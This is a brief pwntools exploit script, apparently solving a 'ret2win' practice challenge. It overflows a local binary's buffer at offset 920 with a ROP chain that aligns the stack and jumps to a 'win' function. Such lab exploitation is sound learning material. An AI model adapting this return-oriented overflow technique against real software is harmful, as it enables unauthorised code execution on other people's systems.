from pwn import *

elf = context.binary = ELF("./ret2win")

rop = ROP(elf)
rop.raw(rop.ret)
rop.call(elf.symbols["win"])

r = process("./ret2win")

payload = flat({920: rop.chain()})
r.sendline(payload)

r.interactive()

